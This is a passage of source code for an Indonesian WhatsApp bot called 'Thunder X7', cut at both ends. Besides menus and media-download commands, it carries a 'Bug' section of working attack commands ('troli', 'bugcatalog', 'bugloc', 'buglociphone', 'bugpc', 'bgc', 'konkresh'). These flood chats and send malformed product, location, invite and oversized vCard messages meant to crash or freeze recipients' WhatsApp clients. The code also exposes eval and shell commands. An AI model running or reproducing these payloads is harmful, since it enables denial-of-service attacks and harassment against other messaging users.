	}
	
	if (imagenye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./database/temp/foto/${namastc}jpeg`)
	thunderx7.sendMessage(from, buffer, image, {quoted : thunder})
	}
	
	if (videonye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./database/temp/video/${namastc}.mp4`)
	thunderx7.sendMessage(from, buffer, video, {quoted : thunder})
	}
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m〽️\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;34m~\x1b[1;34m>', '[\x1b[34mThunder X7 Bot\x1b[34m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	// if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
        if (!thunder.key.fromMe && !isOwner && banChats === true) return

const atibot = thunder.isBaileys
if (atibot === true) return

//auto vn

              if (!isCmd && thunder.message) {
              	if (fakevn === false) return
             for (let i of totalchat) {
          thunderx7.updatePresence(i.jid, Presence.recording)
                   } 
                   }   
                   
                   if (responderthunder == 'oi') {
                const oi = fs.readFileSync('./database/media/yahdh.mp3')
                thunderx7.sendMessage(from, oi, MessageType.audio, {quoted: freplythunder, mimetype: 'audio/mp4', duration: '999999', ptt:true})
                  }
                  if (bodylist == '𝐴𝑙𝑙 𝑀𝑒𝑛𝑢 𖣂') {
                const timestampp = speed();
	const latensii = speed() - timestampp
	run = process.uptime() 
    teks = `${kyun(run)}`
    try {
pic = await thunderx7.getProfilePicture(sender)
} catch {
pic = 'https://f.top4top.io/p_2070lr1hy0.jpeg'
}
gambar = await getBuffer(pic)
gambarmenu = await thunderx7.prepareMessage(from, gambar, image, {thumbnail: gambar})
gbutsan = [
  {buttonId: 'Creator', buttonText: {displayText: 'Creator'}, type: 1},
]
 buttonmenuz = {
imageMessage: gambarmenu.message.imageMessage,
    footerText: help.menu(pushname, sender, prefix, banChats, ucapanWaktu, timeWib, timeWit, timeWita),
    contentText: `𝑆𝑝𝑒𝑒𝑑    :\n${latensii.toFixed(4)} 𝑆𝑒𝑐𝑜𝑛𝑑𝑠\n𝑅𝑢𝑛 𝑇𝑖𝑚𝑒 : ${teks}\n`,
    buttons: gbutsan,
    headerType: 4
}
await thunderx7.sendMessage(from, buttonmenuz, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./database/stik/fake.jpeg'),
        caption: help.menu(pushname, sender, prefix, banChats, ucapanWaktu, timeWib, timeWit, timeWita),
        "contextInfo": {
            mentionedJid: [sender]},
            quoted: freplythunder})
                  }
                  //
                  if (bodylist == '𝐴𝑏𝑜𝑢𝑡 𖣂') {
                const y = `𖣂  「 𝑇ℎ𝑎𝑛𝑘𝑠 𝑇𝑜 : 」  
│
├  ▢  : 𖥂 𝐙⃪𝚴𝚾߫ 𝐒𝐘𝐍𝐃𝚰𝐂𝚫𝐓͢𝚵 𝐂𝚯𝐑𝐏𝚯𝐑⃕𝚫𝐓𝐈𝚯⃪𝐍 𖥂
├  ▢  : XChilds
├  ▢  : HexaGonz
├  ▢  : MhankBarBar
├  ▢  : Xnz Bot
├  ▢  : My Mans 404
├  ▢  : HW MODS WA
├  ▢  : X - Dev
├  ▢  : Ramlan ID
├  ▢  : Pito Dev
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝑆𝑡𝑎𝑡𝑢𝑠 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}self
│𝚫 ${prefix}public
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝑂𝑡ℎ𝑒𝑟 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}ping
│𝚫 ${prefix}sourcecode
│𝚫 ${prefix}wakelock
│𝚫 ${prefix}unwakelock
│𝚫 x eval
│𝚫 => eval async
│𝚫 $ command
│𝚫 ${prefix}join <link gc>
│𝚫 ${prefix}listrespon
│𝚫 ${prefix}caripesan <link/teks>
│𝚫 ${prefix}inspectweb https://
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝑆𝑒𝑎𝑟𝑐ℎ 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}ytsearch <link/teks>
│𝚫 ${prefix}igstalk <username>
│𝚫 ${prefix}githubstalk <username>
│𝚫 ${prefix}pinterest <link/teks>
│𝚫 ${prefix}brainly <link/teks>
│𝚫 ${prefix}lirik <link/teks>
│𝚫 ${prefix}chara <link/teks>
│𝚫 ${prefix}playstore <link/teks>
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝐷𝑜𝑤𝑛𝑙𝑜𝑎𝑑𝑠 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}play <link/teks>
│𝚫 ${prefix}ig <link/teks>
│𝚫 ${prefix}video <link/teks>
│𝚫 ${prefix}ytmp3 <link>
│𝚫 ${prefix}ytmp4 <link>
│𝚫 ${prefix}igstory <username>
│𝚫 ${prefix}twitter <link>
│𝚫 ${prefix}ttnowm <link>
│𝚫 ${prefix}tiktok <link>
│𝚫 ${prefix}tiktokmp4 <link>
│𝚫 ${prefix}tiktokaudio <link>
│𝚫 ${prefix}tiktokmp3 <link>
│𝚫 ${prefix}fb <link>
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝐴𝑛𝑖𝑚𝑒 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}otaku
│𝚫 ${prefix}anime
│𝚫 ${prefix}neko
│𝚫 ${prefix}waifu
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝑈𝑝𝑠𝑤 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}upswteks
│𝚫 ${prefix}upswimage
│𝚫 ${prefix}upswvideo
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝑆𝑡𝑜𝑟𝑎𝑔𝑒 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}addstik
│𝚫 ${prefix}addimg
│𝚫 ${prefix}addvid
│𝚫 ${prefix}addvn
│𝚫 ${prefix}dellstik
│𝚫 ${prefix}liststik
│𝚫 ${prefix}listimg
│𝚫 ${prefix}listvid
│𝚫 ${prefix}listvn
│𝚫 ${prefix}getstik
│𝚫 ${prefix}getimg
│𝚫 ${prefix}getvid
│𝚫 ${prefix}getvn
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝐴𝑢𝑑𝑖𝑜 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}slowmo
│𝚫 ${prefix}gemok
│𝚫 ${prefix}detikvn <durasi>
│𝚫 ${prefix}bass
│𝚫 ${prefix}tupai
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝐶𝑜𝑛𝑣𝑒𝑟𝑡 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}toimg
│𝚫 ${prefix}tomp3
│𝚫 ${prefix}detikvideo <durasi>
│𝚫 ${prefix}tomp4
│𝚫 ${prefix}slow
│𝚫 ${prefix}fast
│𝚫 ${prefix}reverse
│𝚫 ${prefix}tourl
│𝚫 ${prefix}shortlink
│𝚫 ${prefix}pastebin
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝐺𝑟𝑜𝑢𝑝 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}antivirtex <1/0>
│𝚫 ${prefix}add <628xxx>
│𝚫 ${prefix}linkgrup
│𝚫 ${prefix}inspect <link gc>
│𝚫 ${prefix}setdesc <link/teks>
│𝚫 ${prefix}setname <link/teks>
│𝚫 ${prefix}tagall
│𝚫 ${prefix}kick @
│𝚫 ${prefix}sider
│𝚫 ${prefix}group <open/close>
│𝚫 ${prefix}promote @
│𝚫 ${prefix}demote @
│𝚫 ${prefix}revoke
│𝚫 ${prefix}hidetag
│𝚫 ${prefix}sticktag
│𝚫 ${prefix}totag
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝑀𝑎𝑘𝑒𝑟 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}sticker <image>
│𝚫 ${prefix}style <teks>
│𝚫 ${prefix}size <tag sticker> <jumlah angka>
│𝚫 ${prefix}stickmeme
│𝚫 ${prefix}stickmeme2
│𝚫 ${prefix}stickmeme3
│𝚫 ${prefix}take <author|packname>
│𝚫 ${prefix}emoji <emot>
│𝚫 ${prefix}attp <teks>
│𝚫 ${prefix}nulis <teks>
│𝚫 ${prefix}nulis2 <teks>
│?? ${prefix}nulis3 <teks>
│𝚫 ${prefix}nulis4 <teks>
│𝚫 ${prefix}maker2d2 <teks>
│𝚫 ${prefix}maker2d3 <teks>
│𝚫 ${prefix}maker2d4 <teks>
│𝚫 ${prefix}maker3d <teks>
│𝚫 ${prefix}maker3d2 <teks>
│𝚫 ${prefix}maker3d3 <teks>
│𝚫 ${prefix}maker3d4 <teks>
│𝚫 ${prefix}transformer <teks>
│𝚫 ${prefix}pornhub <teks>|<teks2>
│𝚫 ${prefix}googletxt <teks>
│𝚫 ${prefix}battlefield <teks>
│𝚫 ${prefix}coffeecup <teks>
│𝚫 ${prefix}coffeecup2 <teks>
│𝚫 ${prefix}neon <teks>
│𝚫 ${prefix}pubg <teks1 teks2>
│𝚫 ${prefix}cemetery <teks>
│𝚫 ${prefix}wolf <teks>
│𝚫 ${prefix}cover <teks>
│𝚫 ${prefix}nightsky <teks>
│𝚫 ${prefix}woodblock <teks>
│𝚫 ${prefix}under <teks>
│𝚫 ${prefix}glow <teks>
│𝚫 ${prefix}summer <teks>
│𝚫 ${prefix}flower <teks>
│𝚫 ${prefix}burn <teks>
│𝚫 ${prefix}quote <teks>
│𝚫 ${prefix}wooden <teks>
│𝚫 ${prefix}golden <teks>
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝑂𝑤𝑛𝑒𝑟 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}on
│𝚫 ${prefix}autodelete
│𝚫 ${prefix}bc
│𝚫 ${prefix}bcs
│𝚫 ${prefix}fakevn
│𝚫 ${prefix}autorespon
│𝚫 ${prefix}status
│𝚫 ${prefix}colongsw
│𝚫 ${prefix}autoread
│𝚫 ${prefix}bchide
│𝚫 ${prefix}anticall
│𝚫 ${prefix}addrespon <teks|drama>
│𝚫 ${prefix}dellrespon <key>
│𝚫 ${prefix}off <drama>
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  if (bodylist == '𝐵𝑢𝑔 𖣂') {
                const y = `╭─────────────  
│𝚫 ${prefix}troli <jumlah>
│𝚫 ${prefix}bgc <jumlah>
│𝚫 ${prefix}bugpc (gunakan di private chat)
│𝚫 ${prefix}bugsw <tag gambar>
│𝚫 ${prefix}bugcatalog <teks> <tag gambar>
│𝚫 ${prefix}bugteks <teks>
│𝚫 ${prefix}bugloc <teks>
│𝚫 ${prefix}buglociphone <teks>
│𝚫 ${prefix}bugweb <teks>
│𝚫 ${prefix}virgam <tag gambar>
│𝚫 ${prefix}troliv2 <jumlah>
│
└───────────── `
thunderx7.sendMessage(from, `${y}`, text, {quoted: freplythunder})
                  }
                  //
                  if (bodylist == '𝐷𝑒𝑣𝑒𝑙𝑜𝑝𝑒𝑟 𖣂') {
                 const sourcecode = `Source code

Dari bang tundel

YT: https://youtube.com/c/ThunderX7%E3%81%B907

Github: https://github.com/TheGetsuzoThunder

IG: @thunderx.7`
reply(`${sourcecode}`)
}
  //
switch (command) {
	//**RESPONDER ON OFF**//
	case 'autodelete':
	
                if (!thunder.key.fromMe && !isOwner) return
                anunder = await thunderx7.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
                for (let _ of anunder) {
                    thunderx7.modifyChat(_.jid, 'delete', {
        includeStarred: false
        })
                }
                await reply(`Berhasil menghapus ${anunder.length} pribadi chat`)
                break
            //**RESPONDER ON OFF**//
	//******************* 》BUG MENU《 ********************\\
	case 'troli':
				case 't':
				if (!isOwner && !thunder.key.fromMe) return reply('Skip lu bukan owner !!')
					if (args.length < 1) return reply('Total?')
					for (let i = 0; i < args[0]; i++) {
thunderx7.sendMessage(from, `O`, text, {quoted: ftroli})
					}
reply('Udah kirim sebanyak '+args.join(' '))
					break
case 'troliv2':
	if (!isOwner && !thunder.key.fromMe) return reply('Skip lu bukan owner !!')
					if (args.length < 1) return reply('Total?')
					for (let i = 0; i < args[0]; i++) {
troli2()
}
reply('Udah kirim sebanyak '+args.join(' '))
break
case 'bugswthunder':
				  if (!thunder.key.fromMe && !isOwner) return reply('Lu siapa?')
					buffer = fs.readFileSync(`./database/media/gambar.jpg`)
					thunderx7.sendMessage('status@broadcast', buffer, image, { thumbnail : fs.readFileSync('./database/pirtek/thunder.jpeg')
					})
					setTimeout( () => {
					thunderx7.sendMessage('status@broadcast', `🥶`, MessageType.extendedText)
					reply('🥶')
					}, 3000)
					break
case 'bugcatalog':
   if (!q) return reply(`Teks?`)
 if ((isMedia && !thunder.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo : thunder
   let media = await thunderx7.downloadMediaMessage(encmedia)
   imeu = await thunderx7.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = await thunderx7.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "title": `${q}`,
             "description": `${vapi}`,
             "retailerId": "thunderx7",
         },
         "businessOwnerJid": "62853338317160@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 0,
            "isForwarded": false
        }
    }
}, {quoted: thunder, contextInfo:{}})
   thunderx7.relayWAMessage(res)
}
break
case 'bugdoc':
// if (!thunder.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}bugdoc namalu`)
reply(`Proses..`)
//if (!thunder.key.fromMe) return
tapib1 = fs.readFileSync('./database/media/music.mp3')
thunderx7.sendMessage(from, tapib1, document, { quoted: thunder, filename:`${q} ${vapi}.mp3`, mimetype: 'audio/application' })
break
case 'liveloc':            
            res = await thunderx7.prepareMessageFromContent(from,{
				"liveLocationMessage": {
						"degreesLatitude": -6.1053500000000005,
						"degreesLongitude": 106.71185833333332,
						"caption": `${vapi}`,
						"sequenceNumber": "1632077323798001",
					"jpegThumbnail": fs.readFileSync('./database/pirtek/thunder.jpeg'),
    "contextInfo": {
    }
  }
}, {quoted:thunder, contextInfo:{}}) 
thunderx7.relayWAMessage(res)
break
case  'bugteks':
// if (!thunder.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}.,. namalu`)
thunderx7.sendMessage(from, `${q}`,
					MessageType.text, {
					sendEphemeral: true,
					thumbnail: fs.readFileSync('./database/pirtek/thunder.jpeg')
					})
					break
case  'ephemeral':
// if (!thunder.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}.,. namalu`)
thunderx7.sendMessage(from, `${q}`,
					MessageType.text, {
					sendEphemeral: true,
					})
					break
case 'bugloc':
if (!q) return reply(`Example: ${prefix}buglociphone namalu`)
 thunderx7.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q}.                                                                                                                                                   ${vapi}`,
                                "address": `Thunder x7 bot ${vapi}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'listgroup':
                    let txy = thunderx7.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`${thunderx7.getName(v.jid)}\n${v.jid} [${v.read_only ? 'Left' : 'Joined'}]`).join`\n\n`
                    thunderx7.sendMessage(m.chat, 'List Groups:\n' + txy, m)
                    break
case 'buglociphone':
if (!q) return reply(`Example: ${prefix}buglociphone namalu`)
 thunderx7.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q}.                                                                                                                                                   ${vapi}`,
                                "address": `Thunder x7 bot ${iphone}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'buglociphone':
if (!q) return reply(`Example: ${prefix}bugcatalog namalu`)
 thunderx7.sendMessage(from, { 
								"degreesLatitude": -10.213760,
								"degreesLongitude": 123.594810,
								"name": `${q}.                                                                                                                                                   ${vapi}`,
                                "address": `Thunder x7 bot ${iphone}`,
                                "jpegThumbnail": image },location,{
						})
						break
case 'bugweb':
// if (!thunder.key.fromMe) return reply('Skip lu bukan owner !!')
if (!q) return reply(`Example: ${prefix}bugweb namalu`)
ppimg = await thunderx7.getProfilePicture(sender)
				ddatae = await imageToBase64(JSON.stringify(ppimg).replace(/\"/gi,''))
				thunderx7.sendMessage(from, {text: `https://nhentai.id\n${q}`, matchedText: 'https://nhentai.id', canonicalUrl: 'https://nhentai.id', description: `Bot thunder x7 ${vapi}`, title: `${vapi}`}, 'extendedTextMessage', {detectLinks: true}, {quoted : thunder})
		      break
case 'virgam':
case 'bugsw':
if (!isQuotedImage) return reply('Reply gambarnya!')
			if ((isMedia || isQuotedImage ) && args.length == 0) 
            ger = isQuotedImage ? JSON.parse(JSON.stringify(thunder).replace('quotedM','m')).message.extendedTextMessage.contextInfo : thunder
            media = await thunderx7.downloadAndSaveMediaMessage(ger)
            thunderx7.sendMessage(from, fs.readFileSync(media), image, {thumbnail: fs.readFileSync("./database/pirtek/thunder.jpeg")})
break
case 'bugpc':
					if (!thunder.key.fromMe) return reply(mess.owner)
buf = fs.readFileSync('./database/media/gambar.jpg')
imeu = await thunderx7.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
jk = await thunderx7.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6288224859350-1624969639@g.us",
"inviteCode": "h+64P9RhJDzgXSPf",
"inviteExpiration": "1625338378",
"groupName": `Thunder x7                                  ${vapi}`,
"jpegThumbnail": fs.readFileSync('./database/media/gambar.jpg')
}
}, {quoted:imeu, contextInfo:{}})
thunderx7.relayWAMessage(jk)
await setTimeout(() => {
reply('Thunder x7     ')
}, 3000)
break
case 'bugpc2':
					if (!thunder.key.fromMe) return reply(mess.owner)
buf = fs.readFileSync('./database/media/gambar.jpg')
imeu = await thunderx7.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
jk = await thunderx7.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6288224859350-1624969639@g.us",
"inviteCode": "h+64P9RhJDzgXSPf",
"inviteExpiration": "1625338378",
"groupName": `Thunder x7                                  ${vapi}`,
"jpegThumbnail": fs.readFileSync('./database/pirtek/thunder.jpeg')
}
}, {quoted:imeu, contextInfo:{}})
thunderx7.relayWAMessage(jk)
await setTimeout(() => {
reply('Thunder x7     ')
}, 3000)
break
case 'bgc':
				case 'buggc':
        if (!isOwner && !thunder.key.fromMe) return reply('Skip lu bukan owner !!')
					if (args.length < 1) return reply('Total?')
					for (let i = 0; i < args[0]; i++) {
					await thunderx7.toggleDisappearingMessages(from, 0)
					}
					reply('Udah kirim sebanyak '+args.join(' '))
        break
case 'bugsticker':
if (!thunder.key.fromMe && !isOwner) return
res = await thunderx7.prepareMessageFromContent(from,{
	"stickerMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ar3J73JZWDkALd78sCqG3MhOl8e5O4mLrCB_c83IrW2z.enc",
						"fileSha256": "k1MG4Nx8T0C1H8PBwT7Me9yEhjHksd8tdSl6H6N/TF0=",
						"fileEncSha256": "GEyPQzx5ejVaConK5p5Bm+g/gBULXrSTgjAaFriudfI=",
						"mediaKey": "RalS1uKVh3ysv5aMCDHMqJ9osXF4O3ORlCdn9HsF5xY=",
						"mimetype": "image/webp",
						"sendEphemeral": true,
					    "thumbnail": fs.readFileSync('./database/pirtek/thunder.jpeg'),
						"directPath": "/v/t62.15575-24/12155350_3800086346757642_2527437135372892402_n.enc?ccb=11-4&oh=22c0ea4d51336ce9774713b472e40d90&oe=616F20BC",
						"fileLength": "350946",
						"mediaKeyTimestamp": "1632135185",
						"isAnimated": true
}
}, {quoted:thunder, contextInfo:{}}) 
thunderx7.relayWAMessage(res)
break
case 'konkresh':
				if (!isOwner) return reply('ANDA BUKAN OWNER')
				if(!q) return reply('masukkan jumlah')
				for (let i = 0; i < (q) ; i++){
				res = await thunderx7.prepareMessageFromContent(from, {"contactsArrayMessage": {"displayName": "2929999 contacts", "contacts": [{"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:thunderx7;;;\nFN:thunderx7\nitem1.TEL;waid=6285333831716:+62 853-3383-1716\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}, {"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:thunderx7;;;\nFN:thunderx7\nitem1.TEL;waid=6285333831716:+62 853-3383-1716\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}, {"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:thunderx7;;;\nFN:thunderx7\nitem1.TEL;waid=6285333831716:+62 853-3383-1716\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}, {"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:thunderx7;;;\nFN:thunderx7\nitem1.TEL;waid=6285333831716:+62 853-3383-1716\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx7ftjapa777\nADR;TYPE=WORK:HOME;WHATSAPP.NET:thunderx